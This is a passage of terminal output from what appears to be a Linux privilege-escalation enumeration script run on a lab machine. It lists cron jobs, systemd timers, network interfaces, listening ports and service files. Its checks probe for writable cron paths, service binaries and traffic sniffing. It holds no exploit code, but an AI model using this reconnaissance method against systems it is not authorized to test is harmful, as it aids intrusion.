+/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
+/etc/cron.d/php:09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
+[90m---[0;0m
+[97m[[93m*[97m] [90mret030[97m Can we read user crontabs[90m.......................................[90m nope[0;0m
+[97m[[93m*[97m] [90mret040[97m Can we list other user cron tasks?[90m..............................[90m nope[0;0m
+[97m[[91m![97m] [90mret050[97m Can we write to executable paths present in cron jobs[90m...........[90m nope[0;0m
+[97m[[93m*[97m] [90mret060[97m Can we write to any paths present in cron jobs[90m..................[90m nope[0;0m
+[97m[[94mi[97m] [90mret400[97m Cron files[90m......................................................[34m yes![0;0m
+[90m---[0;0m
+-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x   2 root root 4096 Jul 30 22:18 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rw-r--r--   1 root root  589 Jun 26  2018 mdadm
+-rw-r--r--   1 root root  712 Jan 17  2018 php
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x   2 root root 4096 Oct 21 08:40 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rwxr-xr-x   1 root root  539 Oct 10  2018 apache2
+-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
+-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
+-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
+-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
+-rwxr-xr-x   1 root root  539 Jun 26  2018 mdadm
+-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
+-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x   1 root root  246 Mar 21  2018 ubuntu-advantage-tools
+-rwxr-xr-x   1 root root  214 Jun 27  2018 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x   2 root root 4096 Dec 28  2018 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x   2 root root 4096 Dec 28  2018 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x   2 root root 4096 Jul 30 22:18 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
+-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
+-rwxr-xr-x   1 root root  211 Jun 27  2018 update-notifier-common
+[90m---[0;0m
+[97m[[93m*[97m] [90mret500[97m User systemd timers[90m.............................................[90m nope[0;0m
+[97m[[91m![97m] [90mret510[97m Can we write in any system timer?[90m...............................[90m nope[0;0m
+[97m[[94mi[97m] [90mret900[97m Systemd timers[90m..................................................[34m yes![0;0m
+[90m---[0;0m
+NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
+Sun 2019-11-03 16:39:00 UTC  3min 34s left Sun 2019-11-03 16:09:01 UTC  26min ago    phpsessionclean.timer        phpsessionclean.service
+Sun 2019-11-03 19:23:54 UTC  2h 48min left Sun 2019-11-03 15:18:47 UTC  1h 16min ago motd-news.timer              motd-news.service
+Mon 2019-11-04 00:00:00 UTC  7h left       Sun 2019-11-03 15:18:47 UTC  1h 16min ago fstrim.timer                 fstrim.service
+Mon 2019-11-04 15:33:41 UTC  22h left      Sun 2019-11-03 15:33:41 UTC  1h 1min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a           n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
+n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service
+
+6 timers listed.
+[90m---[0;0m
+[35m================================================================([32m network [35m)=====[0;0m
+[97m[[93m*[97m] [90mnet000[97m Services listening only on localhost[90m............................[36m yes![0;0m
+[90m---[0;0m
+tcp    LISTEN   0        128             127.0.0.1:5000           0.0.0.0:*     
+[90m---[0;0m
+[97m[[91m![97m] [90mnet010[97m Can we sniff traffic with tcpdump?[90m..............................[90m nope[0;0m
+[97m[[94mi[97m] [90mnet500[97m NIC and IP information[90m..........................................[34m yes![0;0m
+[90m---[0;0m
+br-1bad9bd75d17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+        inet6 fe80::42:5aff:fe86:1b3f  prefixlen 64  scopeid 0x20<link>
+        ether 02:42:5a:86:1b:3f  txqueuelen 0  (Ethernet)
+        RX packets 1274  bytes 70788 (70.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1335  bytes 106077 (106.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:70:c7:2c:42  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.159  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::250:56ff:feb9:bbc8  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::250:56ff:feb9:bbc8  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b9:bb:c8  txqueuelen 1000  (Ethernet)
+        RX packets 637847  bytes 114114184 (114.1 MB)
+        RX errors 0  dropped 22  overruns 0  frame 0
+        TX packets 540217  bytes 125457036 (125.4 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 15217  bytes 1144224 (1.1 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 15217  bytes 1144224 (1.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+vethd53c6ce: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet6 fe80::4ac:dfff:febf:dbdb  prefixlen 64  scopeid 0x20<link>
+        ether 06:ac:df:bf:db:db  txqueuelen 0  (Ethernet)
+        RX packets 1274  bytes 88624 (88.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1351  bytes 107293 (107.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+[90m---[0;0m
+[97m[[94mi[97m] [90mnet510[97m Routing table[90m...................................................[34m yes![0;0m
+[90m---[0;0m
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         10.10.10.2      0.0.0.0         UG    0      0        0 eth0
+10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
+172.18.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-1bad9bd75d17
+[90m---[0;0m
+[97m[[94mi[97m] [90mnet520[97m ARP table[90m.......................................................[34m yes![0;0m
+[90m---[0;0m
+? (10.10.10.2) at 00:50:56:aa:9c:8d [ether] on eth0
+? (172.18.0.2) at 02:42:ac:12:00:02 [ether] on br-1bad9bd75d17
+[90m---[0;0m
+[97m[[94mi[97m] [90mnet530[97m Namerservers[90m....................................................[34m yes![0;0m
+[90m---[0;0m
+nameserver 127.0.0.53
+[90m---[0;0m
+[97m[[94mi[97m] [90mnet540[97m Systemd Nameservers[90m.............................................[34m yes![0;0m
+[90m---[0;0m
+Global
+          DNSSEC NTA: 10.in-addr.arpa
+                      16.172.in-addr.arpa
+                      168.192.in-addr.arpa
+                      17.172.in-addr.arpa
+                      18.172.in-addr.arpa
+                      19.172.in-addr.arpa
+                      20.172.in-addr.arpa
+                      21.172.in-addr.arpa
+                      22.172.in-addr.arpa
+                      23.172.in-addr.arpa
+                      24.172.in-addr.arpa
+                      25.172.in-addr.arpa
+                      26.172.in-addr.arpa
+                      27.172.in-addr.arpa
+                      28.172.in-addr.arpa
+                      29.172.in-addr.arpa
+                      30.172.in-addr.arpa
+                      31.172.in-addr.arpa
+                      corp
+                      d.f.ip6.arpa
+                      home
+                      internal
+                      intranet
+                      lan
+                      local
+                      private
+                      test
+
+Link 6 (vethd53c6ce)
+      Current Scopes: none
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+
+Link 4 (docker0)
+      Current Scopes: none
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+
+Link 3 (br-1bad9bd75d17)
+      Current Scopes: none
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+
+Link 2 (eth0)
+      Current Scopes: none
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+[90m---[0;0m
+[97m[[94mi[97m] [90mnet550[97m Listening TCP[90m...................................................[34m yes![0;0m
+[90m---[0;0m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
+tcp        2      0 0.0.0.0:13123           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+[90m---[0;0m
+[97m[[94mi[97m] [90mnet560[97m Listening UDP[90m...................................................[34m yes![0;0m
+[90m---[0;0m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+[90m---[0;0m
+[35m===============================================================([32m services [35m)=====[0;0m
+[97m[[91m![97m] [90msrv000[97m Can we write in service files?[90m..................................[90m nope[0;0m
+[97m[[91m![97m] [90msrv010[97m Can we write in binaries executed by services?[90m..................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv020[97m Files in /etc/init.d/ not belonging to root[90m.....................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv030[97m Files in /etc/rc.d/init.d not belonging to root[90m.................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv040[97m Upstart files not belonging to root[90m.............................[90m nope[0;0m
+[97m[[93m*[97m] [90msrv050[97m Files in /usr/local/etc/rc.d not belonging to root[90m..............[90m nope[0;0m
+[97m[[94mi[97m] [90msrv400[97m Contents of /etc/inetd.conf[90m.....................................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv410[97m Contents of /etc/xinetd.conf[90m....................................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv420[97m List /etc/xinetd.d if used[90m......................................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv430[97m List /etc/init.d/ permissions[90m...................................[34m yes![0;0m
+[90m---[0;0m
+total 216
+drwxr-xr-x   2 root root 4096 Oct 21 08:42 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rwxr-xr-x   1 root root 2269 Apr 22  2017 acpid
+-rwxr-xr-x   1 root root 8181 Oct 10  2018 apache2
+-rwxr-xr-x   1 root root 2489 Oct 10  2018 apache-htcacheclean
+-rwxr-xr-x   1 root root 4335 Mar 22  2018 apparmor
+-rwxr-xr-x   1 root root 2802 Nov 20  2017 apport
+-rwxr-xr-x   1 root root 1071 Aug 21  2015 atd
+-rwxr-xr-x   1 root root 1232 Apr 19  2018 console-setup.sh
+-rwxr-xr-x   1 root root 3049 Nov 16  2017 cron
+-rwxr-xr-x   1 root root  937 Mar 18  2018 cryptdisks
+-rwxr-xr-x   1 root root  978 Mar 18  2018 cryptdisks-early
+-rwxr-xr-x   1 root root 2813 Nov 15  2017 dbus
+-rwxr-xr-x   1 root root 3843 May  4  2019 docker
+-rwxr-xr-x   1 root root 4489 Jun 28  2018 ebtables
+-rwxr-xr-x   1 root root  985 Jul 13  2018 grub-common
+-rwxr-xr-x   1 root root 3809 Feb 14  2018 hwclock.sh
+-rwxr-xr-x   1 root root 2444 Oct 25  2017 irqbalance
+-rwxr-xr-x   1 root root 1503 Feb 21  2018 iscsid
+-rwxr-xr-x   1 root root 1479 Feb 15  2018 keyboard-setup.sh
+-rwxr-xr-x   1 root root 2044 Aug 15  2017 kmod
+-rwxr-xr-x   1 root root  695 Dec  3  2017 lvm2
+-rwxr-xr-x   1 root root  571 Dec  3  2017 lvm2-lvmetad
+-rwxr-xr-x   1 root root  586 Dec  3  2017 lvm2-lvmpolld
+-rwxr-xr-x   1 root root 2378 Jun 16  2018 lxcfs
+-rwxr-xr-x   1 root root 2240 Jun  5  2018 lxd
+-rwxr-xr-x   1 root root 2653 Jun 26  2018 mdadm
+-rwxr-xr-x   1 root root 1249 Jun 26  2018 mdadm-waitidle
+-rwxr-xr-x   1 root root 4597 Nov 25  2016 networking
+-rwxr-xr-x   1 root root 5658 Aug  3  2017 nfs-common
+-rwxr-xr-x   1 root root 4579 Apr  6  2018 nginx
+-rwxr-xr-x   1 root root 2503 Feb 21  2018 open-iscsi
+-rwxr-xr-x   1 root root 1846 Mar 22  2018 open-vm-tools
+-rwxr-xr-x   1 root root 4793 Apr 18  2019 php7.2-fpm
+-rwxr-xr-x   1 root root 1366 Jan 17  2018 plymouth
+-rwxr-xr-x   1 root root  752 Jan 17  2018 plymouth-log
+-rwxr-xr-x   1 root root 1191 Jan 17  2018 procps
+-rwxr-xr-x   1 root root 2358 May  5  2017 rpcbind
+-rwxr-xr-x   1 root root 4355 Dec 13  2017 rsync
+-rwxr-xr-x   1 root root 2864 Jan 14  2018 rsyslog
+-rwxr-xr-x   1 root root 1222 May 21  2017 screen-cleanup
+-rwxr-xr-x   1 root root 3837 Jan 25  2018 ssh
+-rwxr-xr-x   1 root root 5974 Apr 20  2018 udev
+-rwxr-xr-x   1 root root 2083 Aug 15  2017 ufw
+-rwxr-xr-x   1 root root 1306 May 16  2018 uuidd
+[90m---[0;0m
+[97m[[94mi[97m] [90msrv440[97m List /etc/rc.d/init.d permissions[90m...............................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv450[97m List /usr/local/etc/rc.d permissions[90m............................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv460[97m List /etc/init/ permissions[90m.....................................[34m yes![0;0m
+[90m---[0;0m
+total 28
+drwxr-xr-x   2 root root 4096 Oct 21 08:42 .
+drwxr-xr-x 102 root root 4096 Oct 21 09:59 ..
+-rw-r--r--   1 root root 1875 May  4  2019 docker.conf
+-rw-r--r--   1 root root  448 Apr 18  2019 php7.2-fpm.conf
+-rw-r--r--   1 root root  815 May  5  2017 portmap-wait.conf
+-rw-r--r--   1 root root  230 May  5  2017 rpcbind-boot.conf
+-rw-r--r--   1 root root 1083 May  5  2017 rpcbind.conf
+[90m---[0;0m
+[97m[[91m![97m] [90msrv500[97m Can we write in systemd service files?[90m..........................[90m nope[0;0m
+[97m[[91m![97m] [90msrv510[97m Can we write in binaries executed by systemd services?[90m..........[90m nope[0;0m
+[97m[[93m*[97m] [90msrv520[97m Systemd files not belonging to root[90m.............................[90m nope[0;0m
+[97m[[94mi[97m] [90msrv900[97m Systemd config files permissions[90m................................[34m yes![0;0m
+[90m---[0;0m
+/etc/systemd/:
+total 36K
+drwxr-xr-x 15 root root 4.0K Oct 21 08:42 system
+-rw-r--r--  1 root root 1.1K Apr 20  2018 journald.conf
+-rw-r--r--  1 root root 1022 Apr 20  2018 logind.conf
+drwxr-xr-x  2 root root 4.0K Apr 20  2018 network
+-rw-r--r--  1 root root  601 Apr 20  2018 resolved.conf
+-rw-r--r--  1 root root 1.7K Apr 20  2018 system.conf
+-rw-r--r--  1 root root  604 Apr 20  2018 timesyncd.conf
+drwxr-xr-x  2 root root 4.0K Apr 20  2018 user
+-rw-r--r--  1 root root 1.2K Jan 28  2018 user.conf
+
+/etc/systemd/system:
+total 52K
+lrwxrwxrwx 1 root root   36 Oct 21 08:42 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
+drwxr-xr-x 2 root root 4.0K Oct 21 08:42 multi-user.target.wants
+lrwxrwxrwx 1 root root    9 Oct 10 09:03 networkd-dispatcher.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Oct 10 09:03 systemd-networkd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Oct 10 09:03 systemd-networkd.socket -> /dev/null
+lrwxrwxrwx 1 root root    9 Oct 10 09:03 systemd-networkd-wait-online.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Oct 10 08:59 network-online.target.wants
+lrwxrwxrwx 1 root root    9 May 28 17:25 apache2.service -> /dev/null
+lrwxrwxrwx 1 root root    9 May 28 17:25 apache-htcacheclean.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K May 17 22:33 timers.target.wants
+drwxr-xr-x 2 root root 4.0K May  6 21:21 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 paths.target.wants
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 sysinit.target.wants
+lrwxrwxrwx 1 root root    9 Dec 28  2018 apt-daily-upgrade.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Dec 28  2018 apt-daily.service -> /dev/null
+lrwxrwxrwx 1 root root   31 Dec 28  2018 sshd.service -> /lib/systemd/system/ssh.service
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 remote-fs.target.wants
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 final.target.wants
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 cloud-final.service.wants
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 open-vm-tools.service.requires
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 graphical.target.wants
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 default.target.wants
+lrwxrwxrwx 1 root root   38 Dec 28  2018 iscsi.service -> /lib/systemd/system/open-iscsi.service
+lrwxrwxrwx 1 root root   44 Dec 28  2018 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
+drwxr-xr-x 2 root root 4.0K Dec 28  2018 getty.target.wants
+lrwxrwxrwx 1 root root   35 Dec 28  2018 syslog.service -> /lib/systemd/system/rsyslog.service
+
+/etc/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 36 Oct 21 08:42 thermald.service -> /lib/systemd/system/thermald.service
+lrwxrwxrwx 1 root root 38 Oct 10 08:59 networking.service -> /lib/systemd/system/networking.service
+lrwxrwxrwx 1 root root 32 Jul 30 00:24 cron.service -> /lib/systemd/system/cron.service
+lrwxrwxrwx 1 root root 38 May 17 22:35 php7.2-fpm.service -> /lib/systemd/system/php7.2-fpm.service
+lrwxrwxrwx 1 root root 35 May 17 22:35 apache2.service -> /lib/systemd/system/apache2.service
+lrwxrwxrwx 1 root root 34 May  6 17:24 docker.service -> /lib/systemd/system/docker.service
+lrwxrwxrwx 1 root root 38 May  6 17:24 containerd.service -> /lib/systemd/system/containerd.service
+lrwxrwxrwx 1 root root 33 May  6 17:23 nginx.service -> /lib/systemd/system/nginx.service
+lrwxrwxrwx 1 root root 31 Dec 28  2018 ssh.service -> /lib/systemd/system/ssh.service
+lrwxrwxrwx 1 root root 37 Dec 28  2018 nfs-client.target -> /lib/systemd/system/nfs-client.target
+lrwxrwxrwx 1 root root 42 Dec 28  2018 lxd-containers.service -> /lib/systemd/system/lxd-containers.service
+lrwxrwxrwx 1 root root 37 Dec 28  2018 pollinate.service -> /lib/systemd/system/pollinate.service
+lrwxrwxrwx 1 root root 33 Dec 28  2018 snapd.service -> /lib/systemd/system/snapd.service
+lrwxrwxrwx 1 root root 40 Dec 28  2018 snapd.seeded.service -> /lib/systemd/system/snapd.seeded.service
+lrwxrwxrwx 1 root root 44 Dec 28  2018 snapd.core-fixup.service -> /lib/systemd/system/snapd.core-fixup.service
+lrwxrwxrwx 1 root root 44 Dec 28  2018 snapd.autoimport.service -> /lib/systemd/system/snapd.autoimport.service
+lrwxrwxrwx 1 root root 41 Dec 28  2018 open-vm-tools.service -> /lib/systemd/system/open-vm-tools.service
+lrwxrwxrwx 1 root root 31 Dec 28  2018 ufw.service -> /lib/systemd/system/ufw.service
+lrwxrwxrwx 1 root root 38 Dec 28  2018 irqbalance.service -> /lib/systemd/system/irqbalance.service
+lrwxrwxrwx 1 root root 36 Dec 28  2018 ebtables.service -> /lib/systemd/system/ebtables.service
+lrwxrwxrwx 1 root root 33 Dec 28  2018 rsync.service -> /lib/systemd/system/rsync.service
+lrwxrwxrwx 1 root root 31 Dec 28  2018 atd.service -> /lib/systemd/system/atd.service
+lrwxrwxrwx 1 root root 41 Dec 28  2018 console-setup.service -> /lib/systemd/system/console-setup.service
+lrwxrwxrwx 1 root root 36 Dec 28  2018 ondemand.service -> /lib/systemd/system/ondemand.service
+lrwxrwxrwx 1 root root 36 Dec 28  2018 remote-fs.target -> /lib/systemd/system/remote-fs.target
+lrwxrwxrwx 1 root root 35 Dec 28  2018 rsyslog.service -> /lib/systemd/system/rsyslog.service
+lrwxrwxrwx 1 root root 44 Dec 28  2018 systemd-resolved.service -> /lib/systemd/system/systemd-resolved.service
+
+/etc/systemd/system/network-online.target.wants:
+total 0
+lrwxrwxrwx 1 root root 38 Oct 10 08:59 networking.service -> /lib/systemd/system/networking.service
+
+/etc/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 41 May 17 22:33 phpsessionclean.timer -> /lib/systemd/system/phpsessionclean.timer
+lrwxrwxrwx 1 root root 43 Dec 28  2018 snapd.snap-repair.timer -> /lib/systemd/system/snapd.snap-repair.timer
+lrwxrwxrwx 1 root root 32 Dec 28  2018 fstrim.timer -> /lib/systemd/system/fstrim.timer
+lrwxrwxrwx 1 root root 35 Dec 28  2018 motd-news.timer -> /lib/systemd/system/motd-news.timer
+
+/etc/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 33 May  6 17:24 docker.socket -> /lib/systemd/system/docker.socket
+lrwxrwxrwx 1 root root 33 Dec 28  2018 iscsid.socket -> /lib/systemd/system/iscsid.socket
+lrwxrwxrwx 1 root root 30 Dec 28  2018 lxd.socket -> /lib/systemd/system/lxd.socket
+lrwxrwxrwx 1 root root 32 Dec 28  2018 snapd.socket -> /lib/systemd/system/snapd.socket
+lrwxrwxrwx 1 root root 41 Dec 28  2018 apport-forward.socket -> /lib/systemd/system/apport-forward.socket
+lrwxrwxrwx 1 root root 32 Dec 28  2018 acpid.socket -> /lib/systemd/system/acpid.socket
+lrwxrwxrwx 1 root root 32 Dec 28  2018 uuidd.socket -> /lib/systemd/system/uuidd.socket
+lrwxrwxrwx 1 root root 35 Dec 28  2018 dm-event.socket -> /lib/systemd/system/dm-event.socket
+
+/etc/systemd/system/paths.target.wants:
+total 0
+lrwxrwxrwx 1 root root 42 Dec 28  2018 apport-autoreport.path -> /lib/systemd/system/apport-autoreport.path
+lrwxrwxrwx 1 root root 30 Dec 28  2018 acpid.path -> /lib/systemd/system/acpid.path
+
+/etc/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 38 Dec 28  2018 open-iscsi.service -> /lib/systemd/system/open-iscsi.service
+lrwxrwxrwx 1 root root 36 Dec 28  2018 apparmor.service -> /lib/systemd/system/apparmor.service
+lrwxrwxrwx 1 root root 40 Dec 28  2018 lvm2-lvmpolld.socket -> /lib/systemd/system/lvm2-lvmpolld.socket
+lrwxrwxrwx 1 root root 39 Dec 28  2018 lvm2-lvmetad.socket -> /lib/systemd/system/lvm2-lvmetad.socket
+lrwxrwxrwx 1 root root 40 Dec 28  2018 lvm2-monitor.service -> /lib/systemd/system/lvm2-monitor.service
+lrwxrwxrwx 1 root root 44 Dec 28  2018 blk-availability.service -> /lib/systemd/system/blk-availability.service
+lrwxrwxrwx 1 root root 42 Dec 28  2018 keyboard-setup.service -> /lib/systemd/system/keyboard-setup.service
+lrwxrwxrwx 1 root root 36 Dec 28  2018 setvtrgb.service -> /lib/systemd/system/setvtrgb.service
+lrwxrwxrwx 1 root root 45 Dec 28  2018 systemd-timesyncd.service -> /lib/systemd/system/systemd-timesyncd.service
+
+/etc/systemd/system/remote-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 37 Dec 28  2018 nfs-client.target -> /lib/systemd/system/nfs-client.target
+
+/etc/systemd/system/final.target.wants:
+total 0
+lrwxrwxrwx 1 root root 49 Dec 28  2018 snapd.system-shutdown.service -> /lib/systemd/system/snapd.system-shutdown.service
+
+/etc/systemd/system/cloud-final.service.wants:
+total 0
+lrwxrwxrwx 1 root root 40 Dec 28  2018 snapd.seeded.service -> /lib/systemd/system/snapd.seeded.service
+
+/etc/systemd/system/open-vm-tools.service.requires:
+total 0
+lrwxrwxrwx 1 root root 34 Dec 28  2018 vgauth.service -> /lib/systemd/system/vgauth.service
+
+/etc/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 43 Dec 28  2018 accounts-daemon.service -> /lib/systemd/system/accounts-daemon.service
+
+/etc/systemd/system/default.target.wants:
+total 0
+lrwxrwxrwx 1 root root 38 Dec 28  2018 ureadahead.service -> /lib/systemd/system/ureadahead.service
+
+/etc/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 34 Dec 28  2018 getty@tty1.service -> /lib/systemd/system/getty@.service
+
+/etc/systemd/network:
+total 0
+
+/etc/systemd/user:
+total 0
+
+/lib/systemd/:
+total 7.3M
+drwxr-xr-x 22 root root  36K Oct 21 08:41 system
+drwxr-xr-x  2 root root 4.0K Oct 21 08:40 system-generators
+drwxr-xr-x  2 root root 4.0K Oct 21 08:39 network
+drwxr-xr-x  2 root root 4.0K Oct 21 08:39 system-preset
+-rw-r--r--  1 root root 2.3M Sep 30 15:23 libsystemd-shared-237.so
+-rw-r--r--  1 root root  699 Sep 30 15:23 resolv.conf
+-rwxr-xr-x  1 root root 1.3K Sep 30 15:23 set-cpufreq
+-rwxr-xr-x  1 root root 1.6M Sep 30 15:23 systemd
+-rwxr-xr-x  1 root root 6.0K Sep 30 15:23 systemd-ac-power
+-rwxr-xr-x  1 root root  18K Sep 30 15:23 systemd-backlight
+-rwxr-xr-x  1 root root  11K Sep 30 15:23 systemd-binfmt
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-cgroups-agent
+-rwxr-xr-x  1 root root  27K Sep 30 15:23 systemd-cryptsetup
+-rwxr-xr-x  1 root root  15K Sep 30 15:23 systemd-dissect
+-rwxr-xr-x  1 root root  18K Sep 30 15:23 systemd-fsck
+-rwxr-xr-x  1 root root  23K Sep 30 15:23 systemd-fsckd
+-rwxr-xr-x  1 root root  19K Sep 30 15:23 systemd-growfs
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-hibernate-resume
+-rwxr-xr-x  1 root root  23K Sep 30 15:23 systemd-hostnamed
+-rwxr-xr-x  1 root root  15K Sep 30 15:23 systemd-initctl
+-rwxr-xr-x  1 root root 127K Sep 30 15:23 systemd-journald
+-rwxr-xr-x  1 root root  35K Sep 30 15:23 systemd-localed
+-rwxr-xr-x  1 root root 215K Sep 30 15:23 systemd-logind
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-makefs
+-rwxr-xr-x  1 root root  15K Sep 30 15:23 systemd-modules-load
+-rwxr-xr-x  1 root root 1.6M Sep 30 15:23 systemd-networkd
+-rwxr-xr-x  1 root root  19K Sep 30 15:23 systemd-networkd-wait-online
+-rwxr-xr-x  1 root root  11K Sep 30 15:23 systemd-quotacheck
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-random-seed
+-rwxr-xr-x  1 root root  15K Sep 30 15:23 systemd-remount-fs
+-rwxr-xr-x  1 root root  10K Sep 30 15:23 systemd-reply-password
+-rwxr-xr-x  1 root root 371K Sep 30 15:23 systemd-resolved
+-rwxr-xr-x  1 root root  19K Sep 30 15:23 systemd-rfkill
+-rwxr-xr-x  1 root root  43K Sep 30 15:23 systemd-shutdown
+-rwxr-xr-x  1 root root  19K Sep 30 15:23 systemd-sleep
+-rwxr-xr-x  1 root root  23K Sep 30 15:23 systemd-socket-proxyd
+-rwxr-xr-x  1 root root  11K Sep 30 15:23 systemd-sulogin-shell
+-rwxr-xr-x  1 root root  15K Sep 30 15:23 systemd-sysctl
+-rwxr-xr-x  1 root root 1.3K Sep 30 15:23 systemd-sysv-install
+-rwxr-xr-x  1 root root  27K Sep 30 15:23 systemd-timedated
